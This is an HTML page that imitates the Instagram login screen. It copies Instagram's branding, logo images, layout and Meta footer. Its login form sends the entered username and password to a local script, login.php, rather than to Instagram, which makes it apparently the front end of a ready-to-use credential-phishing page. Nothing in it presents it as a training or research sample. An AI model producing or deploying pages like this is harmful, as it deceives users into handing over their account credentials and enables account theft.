<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Login • Instagram</title>
    <style>
        body { background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .insta-input {
            background: #121212;
            border: 1px solid #363636;
            color: #fafafa;
            font-size: 12px;
            padding: 9px 0 7px 8px;
            outline: none;
            border-radius: 3px;
        }
        .insta-input:focus { border-color: #a8a8a8; }
        .login-btn {
            background-color: #0095f6;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            transition: background-color 0.2s;
        }
        .login-btn:hover { background-color: #1877f2; }
        .divider { height: 1px; background-color: #262626; flex-grow: 1; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    
    <main class="flex-grow flex items-center justify-center max-w-[935px] mx-auto w-full gap-8">
        
        <div class="hidden lg:block relative w-[380px] h-[580px] bg-[url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/Itu9VpUqIQ2.png')] bg-no-repeat bg-[position:-46px_0]">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/G_S_K9zZ_S0.png" 
                 class="absolute top-[27px] right-[18px] w-[250px] transition-opacity duration-1000">
        </div>

        <div class="w-full max-w-[350px] space-y-3">
            
            <div class="bg-black border border-[#262626] p-10 flex flex-col items-center">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d256451a29bd.png" 
                     alt="Instagram" class="w-44 invert mb-8">

                <form action="login.php" method="POST" class="w-full flex flex-col space-y-2">
                    <input type="text" name="user" placeholder="Phone number, username, or email" class="insta-input" required>
                    <input type="password" name="pass" placeholder="Password" class="insta-input" required>
                    
                    <button type="submit" class="login-btn mt-4">Log in</button>
                </form>

                <div class="flex items-center w-full my-4">
                    <div class="divider"></div>
                    <span class="px-4 text-xs font-semibold text-[#8e8e8e]">OR</span>
                    <div class="divider"></div>
                </div>

                <button class="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/PNT9_2_L-vX.png" class="w-4 h-4">
                    Log in with Facebook
                </button>

                <a href="#" class="text-xs text-[#e0f1ff] mt-4">Forgot password?</a>
            </div>

            <div class="bg-black border border-[#262626] p-6 text-center">
                <p class="text-sm text-[#fafafa]">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a></p>
            </div>

            <div class="text-center space-y-4">
                <p class="text-sm text-[#fafafa]">Get the app.</p>
                <div class="flex justify-center gap-2">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_tI.png" class="h-10">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" class="h-10">
                </div>
            </div>
        </div>
    </main>

    <footer class="p-8 text-[#8e8e8e] text-xs text-center flex flex-wrap justify-center gap-4">
        <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span>
        <span>© 2026 Instagram from Meta</span>
    </footer>

</body>
</html>